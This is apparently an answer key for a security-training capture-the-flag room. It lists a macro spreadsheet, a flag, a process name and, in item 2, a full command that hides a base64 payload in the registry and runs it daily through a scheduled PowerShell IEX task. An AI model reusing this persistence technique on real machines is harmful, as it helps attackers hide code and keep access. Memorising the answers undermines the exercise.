1. 1. SwiftSpend_Financial_Expenses.xlsm
   2. \"cmd.exe\" /c \"reg add HKCU\\SOFTWARE\\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyB3d3cueW91YXJldnVsbmVyYWJsZS50aG0= /f & schtasks.exe /Create /F /TN \"ATOMIC-T1053.005\" /TR \"cmd /c start /min \\\"\\\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\\\SOFTWARE\\\\ATOMIC-T1053.005).test)))\" /sc daily /st 12:34\"
   3. 12:34
   4. ping www.youarevulnerable.thm
   5. I_AM_M0NIT0R1NG
   6. memotech.exe
   7. THM{M0N1T0R_1$_1N_3FF3CT}
